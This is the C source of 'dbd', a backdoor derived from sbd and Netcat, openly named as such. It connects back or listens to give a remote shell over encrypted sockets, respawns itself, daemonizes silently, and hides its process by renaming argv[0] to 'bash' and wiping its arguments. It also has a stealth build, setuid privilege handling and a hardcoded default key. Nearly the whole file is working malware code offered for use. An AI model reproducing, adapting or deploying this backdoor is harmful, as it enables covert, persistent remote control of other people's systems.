/*
 * dbd - durandal's backdoor - $Revision: 1.00 $
 * Copyright (C) 2012 Kyle Barnthouse <durandal@gitbrew.org>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation; either version 2 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc., 59
 * Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 * See the COPYING file for more information.
 *
 ******************************************************************************
 * Shamelessly ripped from the now defunct sbd
 * Copyright (C) 2004 Michel Blomgren <michel.blomgren@tigerteam.se>
 *
 ******************************************************************************
 *
 * dbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe
 * Devine <devine@cr0.net> and is distributed under the GNU General Public
 * License (GPL).
 *
 ******************************************************************************
 *
 * Some code has been derived from doexec.c from the Win32 port of Netcat (C)
 * Weld Pond and *hobbit*. Parts of doexec.c is Copyright (C) 1994 Nathaniel
 * W. Mishkin (doexec.c code was originally derived from rlogind.exe). This
 * code has been slightly modified for dbd by Michel Blomgren, and is called
 * doexec_win32.h. doexec_unix.h is completely (C) Michel Blomgren.
 *
 * The original version of Netcat was written by *hobbit* <hobbit@avian.org>
 * The NT version was done by Weld Pond <weld@l0pht.com>
 *
 */

#if defined WIN32 && defined WINMAIN
    /* show some warnings during compilation */
    #warning "compiling without console support!"
    #warning "usage without -q or -e cmd will result in displaying popup boxes for incoming data ;)"
#endif

#if defined WIN32 && defined WINMAIN && defined STEALTH
    /* nop */
#else
static unsigned char rcsid[] =
"$Id: dbd.c,v 1.00 2012/04/05 01:40:00 durandal Exp $";
#endif


/* edit dbd.h to hardcode listen/connect behaviour into dbd */
#include "dbd.h"


#ifdef WIN32
    #define __USE_WIN32_SOCKETS

    #include <stdio.h>
    #include <fcntl.h>
    #include <io.h>
    #include <conio.h>
    #include <winsock.h>
    #include <getopt.h>
    #include <windows.h>

#else
    /* else, assume Unix-like (Linux, *BSD, Solaris, etc.) */
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <signal.h>

    #include <netdb.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>

    #include <string.h>
    #include <errno.h>
    extern int errno;
    extern int h_errno;
#endif


#if defined WIN32 && defined WINMAIN
    #define MAX_NUM_ARGVS 128
    int argc;
    char *argv[MAX_NUM_ARGVS];
#endif

    extern char *optarg;
    extern int optind, opterr, optopt;




/******** definitions ********/

#ifndef INADDR_NONE
    #define INADDR_NONE 0xffffffff
#endif

/******** global variables ********/

#ifdef WIN32
    #define AUTO_CMD 1
#endif

#ifndef HOST
    #define HOST NULL
#endif
#ifndef BINDHOST
    #define BINDHOST NULL
#endif
#ifndef PORT
    #define PORT 0
#endif
#ifndef SOURCE_PORT
    #define SOURCE_PORT 0
#endif
#ifndef DOLISTEN
    #define DOLISTEN 0
#endif
#ifndef EXECPROG
    #define EXECPROG NULL
#endif
#ifndef CONVERT_TO_CRLF
    #define CONVERT_TO_CRLF 0
#endif

#ifndef ENCRYPTION
    #define ENCRYPTION 1
#endif
#ifndef SHARED_SECRET
    #define SHARED_SECRET "lulzsecpwnsj00"
#endif

#ifndef RESPAWN_ENABLED
    #define RESPAWN_ENABLED 0
#endif
#ifndef RESPAWN_INTERVAL
    #define RESPAWN_INTERVAL 0
#endif

#ifndef QUIET
    #define QUIET 0
#endif
#ifndef VERBOSE
    #define VERBOSE 0
#endif
#ifndef USE_DNS
    #define USE_DNS 1
#endif
#ifndef SNOOPING
    #define SNOOPING 0
#endif
#ifndef DAEMONIZE
    #define DAEMONIZE 0
#endif
#ifndef CLOAK
    #define CLOAK 0
#endif

#ifndef IMMOBILITY_TIMEOUT
    #define IMMOBILITY_TIMEOUT 0
#endif

#ifndef HIGHLIGHT_INPUT
    #define HIGHLIGHT_INCOMING 0
#endif
#ifndef HIGHLIGHT_PREFIX
    #define HIGHLIGHT_PREFIX "\x1b[0;32m"
#endif
#ifndef HIGHLIGHT_SUFFIX
    #define HIGHLIGHT_SUFFIX "\x1b[0m"
#endif
#ifndef SEPARATOR_BETWEEN_PREFIX_AND_DATA
    #define SEPARATOR_BETWEEN_PREFIX_AND_DATA ": "
#endif


char *host = HOST;
char *bind_to_address = BINDHOST;
int port = PORT;
int sport = SOURCE_PORT;
int do_listen = DOLISTEN;
char *program_to_execute = EXECPROG;
int convert_to_crlf = CONVERT_TO_CRLF;
int use_encryption = ENCRYPTION;
char *aes_secret = SHARED_SECRET;

int respawn_enabled = RESPAWN_ENABLED;
int respawn_interval = RESPAWN_INTERVAL;

int quiet = QUIET;
int verbose = VERBOSE;
int use_dns = USE_DNS;
int snooping = SNOOPING;
int daemonize = DAEMONIZE;
int cloak = CLOAK;

int highlight_incoming = HIGHLIGHT_INCOMING;
char highlight_prefix[] = HIGHLIGHT_PREFIX;
char highlight_suffix[] = HIGHLIGHT_SUFFIX;
char *prefix_outgoing_with = NULL;
char separator_between_prefix_and_data[] = SEPARATOR_BETWEEN_PREFIX_AND_DATA;

#ifdef WIN32
    #ifndef RUN_ONLY_ONE_INSTANCE
        #define RUN_ONLY_ONE_INSTANCE 0
    #endif
    #ifndef INSTANCE_SEMAPHORE
        #define INSTANCE_SEMAPHORE "durandal_bd_semaphore"
    #endif
    int only_one_instance = RUN_ONLY_ONE_INSTANCE;
    char dbd_semaphore[] = INSTANCE_SEMAPHORE;
    HANDLE dbd_semhandle;
#endif


#ifndef WIN32
    int immobility_timeout = IMMOBILITY_TIMEOUT;
    int invokeshell = 0;
#endif


/******** functions ********/

#ifdef WIN32
    extern BOOL doexec(SOCKET ClientSocket);
#else
    extern int doexec(int sockfd);
#endif

#include "pel.h"
#include "misc.h"
#include "readwrite.h"


#if defined WIN32 && defined WINMAIN
    /* Are we running winnt? */
    BOOL IsWinNT() {
        OSVERSIONINFO osv;
        osv.dwOSVersionInfoSize = sizeof(osv);
        GetVersionEx(&osv);
        return (osv.dwPlatformId == VER_PLATFORM_WIN32_NT);
    }
#endif


/* socket_code.h contain dbd_listen() and dbd_connect() */
#include "socket_code.h"


#ifdef WIN32
void dbd_release_semaphore(void) {
    ReleaseSemaphore(dbd_semhandle, 1, NULL);
    CloseHandle(dbd_semhandle);
}
#endif


/******** main() ********/

#if defined WIN32 && defined WINMAIN
int PASCAL WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
#else
int main(int argc, char **argv) {
#endif
    int i;
    int used_p = 0;

    /* code starts */

    #if defined WIN32 && defined WINMAIN
        /* parse the command line */
        ParseCommandLine(lpCmd);
    #endif
    if(cloak)
    {
        #ifdef WIN32
        //stub              
        #else
        //change argv[0] to say bash       
        int scrub;
        strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
        strcpy((char *)argv[0], "bash\0");    
        for (scrub = 1; scrub < argc; scrub++)
        {                     
             strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
        }                 
        #endif
    }

    while ((i = getopt(argc, argv, "hlp:a:e:r:c:k:qvnmsw:P:H:VD:X:1:")) != -1) {
        switch(i) {
            case 'l':
                do_listen = 1;
                break;
            case 'p':
                used_p = 1;
                port = atoi(optarg);
                if ((port < 1) || (port > 65535)) {
                    #ifndef WINMAIN
                    if (!quiet)
                        fprintf(stderr, "port must be within 1-65535\n");
                    #else
                        #ifndef STEALTH
                        if (!quiet)
                            errbox("port must be within 1-65535");
                        #endif
                    #endif
                    return 1;
                }
                break;
    	    case 'a':
    	    	bind_to_address = strdup(optarg);
	    	break;
            case 'e':
                program_to_execute = strdup(optarg);
                if (!program_to_execute) {
                    #ifndef WINMAIN
                    if (!quiet)
                        fprintf(stderr, "strdup(): %s\n", strerror(errno));
                    #else
                        #ifndef STEALTH
                        if (!quiet)
                            errbox("strdup() failed!");
                        #endif
                    #endif
                    return 1;
                }
                memset(optarg, 0x20, strlen(optarg));
                break;
            case 'r':
                respawn_interval = atoi(optarg);
                respawn_enabled = 1;
                break;
            case 'c':
                if (!strcasecmp(optarg, "on")) {
                    use_encryption = 1;
                } else if (!strcasecmp(optarg, "off")) {
                    use_encryption = 0;
                } else {
                    #ifndef WINMAIN
                    if (!quiet)
                        fprintf(stderr, "-c can only be \"on\" or \"off\"\n");
                    #else
                        #ifndef STEALTH
                        if (!quiet)
                            errbox("-c can only be \"on\" or \"off\"");
                        #endif
                    #endif
                    return 1;
                }
                break;
            case 'k':
                aes_secret = strdup(optarg);
                /* swab out the passphrase from argv (tested under glibc
                   2.2.5, and NetBSD libc.so.12)
                 */
                memset(optarg, 0x20, strlen(optarg));
                break;
            case 'q':
                if (quiet) {
                    quiet = 0;
                } else {
                    quiet = 1;
                }
                break;
            case 'v':
                verbose++;
                break;
            case 'n':
                if (use_dns) {
                    use_dns = 0;
                } else {
                    use_dns = 1;
                }
                break;
            case 'm':
                if (snooping) {
                    snooping = 0;
                } else {
                    snooping = 1;
                }
                break;
#ifndef WIN32
            case 's':
                if (invokeshell) {
                    invokeshell = 0;
                } else {
                    invokeshell = 1;
                }
                break;
            case 'w':
                immobility_timeout = atoi(optarg);
                break;
#endif
            case 'P':
                prefix_outgoing_with = strdup(optarg);
                memset(optarg, 0x20, strlen(optarg));
                break;
            case 'H':
                if (!strcasecmp(optarg, "on")) {
                    highlight_incoming = 1;
                } else if (!strcasecmp(optarg, "off")) {
                    highlight_incoming = 0;
                } else {
                #ifndef WINMAIN
                    if (!quiet)
                        fprintf(stderr, "-H can only be \"on\" or \"off\"\n");
                #else
                    #ifndef STEALTH
                    if (!quiet)
                        errbox("-H can only be \"on\" or \"off\"");
                    #endif
                #endif
                    return 1;
                }
                break;
            case 'V':
                #ifndef WINMAIN
                    print_version();
                #else
                    #ifndef STEALTH
                        verbox();
                    #endif
                #endif
                return 2;
            case 'D':
                if (!strcasecmp(optarg, "on")) {
                    daemonize = 1;
                } else if (!strcasecmp(optarg, "off")) {
                    daemonize = 0;
                } else {
                #ifndef WINMAIN
                    if (!quiet)
                        fprintf(stderr, "-D can only be \"on\" or \"off\"\n");
                #else
                    #ifndef STEALTH
                    if (!quiet)
                        errbox("-D can only be \"on\" or \"off\"");
                    #endif
                #endif
                    return 1;
                }
                break;
#ifdef WIN32
    /* windows options */
            case 'X':
                if (!strcasecmp(optarg, "on")) {
                    convert_to_crlf = 1;
                } else if (!strcasecmp(optarg, "off")) {
                    convert_to_crlf = 0;
                } else {
                #ifndef WINMAIN
                    if (!quiet)
                        fprintf(stderr, "-X can only be \"on\" or \"off\"\n");
                #else
                    #ifndef STEALTH
                    if (!quiet)
                        errbox("-X can only be \"on\" or \"off\"");
                    #endif
                #endif
                    return 1;
                }
                break;
            case '1':
                if (!strcasecmp(optarg, "on")) {
                    only_one_instance = 1;
                } else if (!strcasecmp(optarg, "off")) {
                    only_one_instance = 0;
                } else {
                    #ifndef WINMAIN
                    if (!quiet)
                        fprintf(stderr, "-1 can only be \"on\" or \"off\"\n");
                    #else
                        #ifndef STEALTH
                        if (!quiet)
                            errbox("-1 can only be \"on\" or \"off\"");
                        #endif
                    #endif
                    return 1;
                }
                break;
#else
    /* unix options */
            case 'X':
            case '1':
                if (!quiet)
                    fprintf(stderr, "-%c is only implemented on Win32\n", i);
                return 1;
#endif

/* back to win32 _and_ unix options */

            case '?':
                #ifdef WINMAIN
                    #ifndef STEALTH
                        errbox("syntax error (-h for help)");
                    #endif
                #endif
                return 1;
            default:
                #ifndef WINMAIN
                    usage();
                #else
                    #ifndef STEALTH
                        message_box_usage();
                    #endif
                #endif
                return 1;
        }
    }


    /* quiet means _quiet!_ */
    if (quiet) {
        verbose = 0;
    } else {
        /* turn on snooping if -vv (-v -v) was specified */
        if (verbose > 1) {
            snooping = 1;
        }
    }

#ifdef WIN32
    if (only_one_instance) {
        dbd_semhandle = CreateSemaphore(NULL, 1, 1, dbd_semaphore);
        if (WaitForSingleObject(dbd_semhandle, 0) == WAIT_TIMEOUT) {
            #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "dbd is already running, use -1off to override!\n");
            #else
                #ifndef STEALTH
                if (!quiet)
                    infobox("dbd is already running, use -1off to override!");
                #endif
            #endif
            CloseHandle(dbd_semhandle);
            return 1;
        }
        atexit(dbd_release_semaphore);
    }

    #ifndef WINMAIN
        if (daemonize) {
            /* daemonize means we wanna be quiet aswell */
            quiet = 1;
            verbose = 0;

            FreeConsole();
        }
    #else
        /* we turn on quiet mode if -Don has been specified when we're running
         * as a WinMain app!
         */
        if (daemonize) {
            quiet = 1;
            verbose = 0;
        }
    #endif


#else

    /* for unix-like OSes... */

    /* if the setuid and/or setgid bit is set on dbd, set effective uid and/or gid */

    if (getuid() != geteuid()) {
        if (setuid(geteuid())) {
            fprintf(stderr, "setuid(geteuid()): %s\n", strerror(errno));
        }
    }
    if (getuid() == 0) {    /* if we're already root, set gid == 0 */
        if (setgid(0)) {
            fprintf(stderr, "setgid(0): %s\n", strerror(errno));
        }
    } else {
        if (getgid() != geteuid()) {
            if (setgid(getegid())) {
                fprintf(stderr, "setgid(getegid()): %s\n", strerror(errno));
            }
        }
    }


    if (invokeshell) {  /* if invokeshell is set, we only invoke a shell (/bin/sh) */
        fprintf(stderr, "invoking shell\n");
        fflush(stderr);
        execlp("/bin/sh", "sh", (char *)NULL);
        fprintf(stderr, "execlp() failed: %s\n", strerror(errno));
        return 1;
    }


    /* we fork() right here, if that's what we want to do */
    if (daemonize) {
        int pid;
        int nullfd;

        /* daemonize means we wanna be quiet aswell */
        quiet = 1;
        verbose = 0;

        pid = fork();
        if (pid > 0) {
            /* the parent exits */
            return 0;
        } else if (pid < 0) {
            perror("fork()");
            return 1;
        }

        /* the child continues... */

        /* redirect stdin, stdout and stderr to /dev/null */
        if ((nullfd = open("/dev/null", O_RDWR)) >= 0) {
            dup2(nullfd, STDIN_FILENO);
            close(nullfd);
            dup2(STDIN_FILENO, STDOUT_FILENO);
            dup2(STDIN_FILENO, STDERR_FILENO);
        }
    }

#endif


    #if defined WIN32 && defined WINMAIN
        /* remove the hour glass */

        /* IsWinNT() and code below derived from "The Insider":
         *      The Insider V1.0 -- Win32 reverse backdoor
         *      nick102799@hotmail.com , Jul 21 2003
         */
        /* Get rid of the startup hourglass XXXXXXXXXXX win 9x ????? */
        if (IsWinNT()) {
            int c;
            MSG msg;
	    while (1) {
	        c = PostThreadMessage(GetCurrentThreadId(), WM_NULL, 0, 0);
	        if (c != 0) {
  		        GetMessage(&msg, NULL, 0, 0);
		        break;
	        }
	        Sleep(100);
	    }
        }
    #endif


    if (do_listen) {
        /* see if we're gonna listen() */
        if (!port) {
            #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "you must specify a port to listen to with -p port\n");
            #else
                #ifndef STEALTH
                if (!quiet)
                    errbox("you must specify a port to listen to with -p port");
                #endif
            #endif
            return 1;
        }

        if (respawn_enabled) {
            while (1) {
                if (dbd_listen(port, bind_to_address) == 1) {
                    return 1;
                }
                #ifndef WINMAIN
                    if (verbose && (respawn_interval > 1)) {
                        fprintf(stderr, "sleeping for %u seconds until re-listening\n", respawn_interval);
                    }
                #endif

                #ifdef WIN32
                    Sleep(respawn_interval * 1000);
                #else
                    sleep(respawn_interval);
                #endif
            }
        } else {
            dbd_listen(port, bind_to_address);
        }

    } else {
        /* else we connect() */

        /* if -p was used with connect, we use -p port as our source port */
        if (used_p) {
            sport = port;
        }

        if (optind < argc) {
            host = strdup(argv[optind]);
            memset(argv[optind], 0x20, strlen(argv[optind]));
            optind++;
            if (optind < argc) {
                port = atoi(argv[optind]);
                memset(argv[optind], 0x20, strlen(argv[optind]));
            }
        }

        if (!host) {
            #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "no host to connect to (-h for help)\n");
            #else
                #ifndef STEALTH
                if (!quiet)
                    errbox("no host to connect to (-h for help)");
                #endif
            #endif
            return 1;
        }

        if (!port) {
            #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "no port to connect to (-h for help)\n");
            #else
                #ifndef STEALTH
                if (!quiet)
                    errbox("no port to connect to (-h for help)");
                #endif
            #endif
            return 1;
        }

        if (respawn_enabled) {
            if (respawn_interval < 1)
                respawn_interval = 1;

            while (1) {
                if (dbd_connect(host, port, sport, bind_to_address) == 1) {
                    return 1;
                }
                #ifndef WINMAIN
                    if (verbose && (respawn_interval > 1)) {
                        fprintf(stderr, "sleeping for %u seconds until reconnecting\n", respawn_interval);
                    }
                #endif

                #ifdef WIN32
                    Sleep(respawn_interval * 1000);
                #else
                    sleep(respawn_interval);
                #endif
            }
        } else {
            dbd_connect(host, port, sport, bind_to_address);
        }
    }

    return 0;
}

